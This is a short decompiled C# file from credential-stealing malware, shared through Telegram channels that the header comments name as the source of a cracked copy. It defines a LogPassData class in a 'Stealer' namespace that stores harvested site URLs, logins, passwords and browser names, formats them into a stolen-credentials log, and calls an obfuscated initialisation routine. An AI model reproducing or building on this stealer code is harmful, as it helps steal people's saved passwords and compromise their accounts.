// Cracked by Milfachs. t.me/milfachs or t.me/stroleyman.
// Telegram Channel - t.me/darkwanna

namespace Stealer
{
  public class LogPassData
  {
    public override string ToString()
    {
      return string.Format("――――――――――――――――――――――――――――――――――――――――――――\r\nSite     | {0}\r\nLogin    | {1}\r\nPassword | {2}\r\nBrowser  | {3}\r\n", (object) this.Url, (object) this.Login, (object) this.Password, (object) this.Program);
    }

    public string Login { get; set; }

    public string Password { get; set; }

    public string Program { get; set; }

    public string Url { get; set; }

    public LogPassData()
    {
      Class11.ARXWv9qzu32dU();
      // ISSUE: explicit constructor call
      base.\u002Ector();
    }
  }
}
